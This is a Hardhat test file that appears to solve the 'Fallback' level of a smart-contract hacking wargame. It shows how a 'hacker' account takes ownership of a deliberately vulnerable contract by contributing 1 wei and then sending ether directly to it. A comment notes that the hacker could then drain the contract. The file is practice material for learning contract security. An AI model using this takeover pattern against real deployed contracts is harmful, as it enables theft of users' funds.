import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 01 - Fallback contract hack", () => {
    async function setUp() {
        const [owner, hacker, Alice, Bob] = await ethers.getSigners();
        const FallbackContract = await ethers.getContractFactory("Fallback");
        const fallback = await FallbackContract.deploy();

        return {owner, hacker, Alice, Bob, fallback};
    };

    describe("When deploying", () => {
        it("Owner should be the owner address", async() => {
            const {owner, hacker, Alice, Bob, fallback} = await loadFixture(setUp);

            expect(await fallback.owner()).to.equal(owner.address);
            expect(await fallback.contributions(owner.address)).to.equal(ethers.parseEther("1000"));
        });
    });

    describe("When hacking", () => {
        it("Owner should be the hacker account after triggering the fallback function", async() => {
            const {owner, hacker, Alice, Bob, fallback} = await loadFixture(setUp);
            
            await fallback.connect(hacker).contribute({value: BigInt(1)}); // Transferring just 1 wei.
            await hacker.sendTransaction({to: await fallback.getAddress(), value: BigInt(1)});

            expect(await fallback.owner()).to.equal(hacker.address);
            // Now I'm entitled to claim up to 1000 ether, which may deplete the contract from the remaining contributor's balance.
        });
    });
});